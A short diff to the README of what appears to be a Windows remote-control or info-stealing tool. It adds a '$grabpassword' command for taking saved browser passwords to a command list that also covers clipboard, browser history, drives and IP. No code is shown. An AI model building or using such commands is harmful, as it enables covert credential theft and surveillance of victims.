@@ -27,10 +27,10 @@ Python3,Windows(x64)
 
 ## **Modules**
 ```
-Availaible commands are :
 $active_window - Gets active window title.
 $clipboard - Gets clipboard content.
 $drives - Lists connected drives.
+$grabpassword - Grabs saved passwords from browsers
 $help - None
 $history - Gets browser history.
 $ip - Gets the computer's IP address.
